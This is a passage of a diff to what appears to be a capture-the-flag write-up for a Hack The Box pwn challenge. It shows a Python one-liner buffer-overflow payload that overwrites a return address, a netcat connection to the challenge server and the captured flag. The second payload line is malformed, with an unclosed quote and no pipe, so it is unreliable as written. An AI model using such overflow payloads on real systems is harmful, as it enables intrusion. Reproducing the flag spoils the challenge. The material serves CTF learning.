@@ -143,4 +143,22 @@ python -c 'print("A"*56 + "\x07\x12\x40\x00")'|./reg Enter your name : Registere
 GETSSSSSSS
 ```
 
-GREAT!
+GREAT! but havent won yet! Lets try server side:
+
+```shell
+nc 161.35.38.187 31195              SIGINT   main 
+Enter your name : jkdfls
+Registered!
+```
+
+Do it the same python string as local file:
+```shell
+python -c 'print("A"*56 + "\x07\x12\x40\x00  nc 161.35.38.187 31195
+Enter your name : Registered!
+Congratulations!
+HTB{N3W_70_pWn}
+```
+
+Voilà!
+
+
